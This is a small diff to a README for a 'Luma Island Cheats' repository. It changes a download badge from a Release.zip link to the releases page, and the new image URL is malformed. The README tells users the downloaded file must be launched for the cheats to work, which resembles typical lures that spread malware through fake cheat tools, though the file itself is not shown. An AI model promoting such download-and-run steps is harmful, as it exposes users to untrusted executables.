@@ -25,7 +25,7 @@ Welcome to the Luma Island Cheats repository, your one-stop destination for all 
 ## 🚀 Download Cheats:
 For the latest cheats and mods for Luma Island, click on the button below to download:
   
-[![Download Cheats](https://img.shields.io/badge/Download%20Cheats-Luma%20Island-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Cheats](https://github.com/Invertrix/Luma-Island-Cheats/releases%20Cheats-Luma%20Island-brightgreen)](https://github.com/Invertrix/Luma-Island-Cheats/releases)
 
 *Note: The downloaded file needs to be launched for the cheats to work.*
 
